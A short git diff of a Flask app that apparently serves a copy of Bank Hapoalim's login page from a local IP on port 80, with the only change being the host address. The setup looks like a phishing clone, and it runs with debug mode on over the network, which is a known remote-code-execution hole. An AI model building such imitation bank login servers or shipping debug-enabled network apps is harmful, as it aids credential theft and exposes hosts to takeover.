@@ -13,4 +13,4 @@ def bank_hapoalim():
     return render_template("בנק הפועלים - כניסה לחשבונך.html")
 
 if __name__ == "__main__":
-    app.run(port =80,debug=True,host="192.168.1.120")
+    app.run(port =80,debug=True,host="172.20.129.109")
